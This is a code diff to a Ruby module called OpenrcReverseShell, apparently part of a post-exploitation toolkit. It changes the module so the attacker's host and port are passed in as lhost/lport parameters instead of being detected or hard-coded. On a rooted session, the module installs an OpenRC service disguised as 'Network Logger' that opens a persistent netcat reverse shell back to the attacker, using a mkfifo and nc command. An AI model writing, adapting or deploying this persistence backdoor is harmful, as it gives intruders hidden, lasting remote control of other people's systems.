@@ -1,5 +1,5 @@
 module OpenrcReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -19,9 +19,6 @@ module OpenrcReverseShell
 
     client.print_good("Session #{sid} is root. Deploying OpenRC reverse shell...")
 
-    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444
-
     # Evitar duplicação
     if session.shell_command_token("test -f #{init_script} && echo 'EXISTS'").include?('EXISTS')
       client.print_status("OpenRC service already exists. Skipping.")
@@ -34,7 +31,7 @@ module OpenrcReverseShell
 
       name="Network Logger"
       command="/bin/sh"
-      command_args="-c 'rm -f /tmp/.o; mkfifo /tmp/.o; /bin/sh -i < /tmp/.o 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.o'"
+      command_args="-c 'rm -f /tmp/.o; mkfifo /tmp/.o; /bin/sh -i < /tmp/.o 2>&1 | nc #{lhost} #{lport} > /tmp/.o'"
       pidfile="/var/run/${RC_SVCNAME}.pid"
       supervise_daemon_args="--stdout-logfile /var/log/${RC_SVCNAME}.log"
 
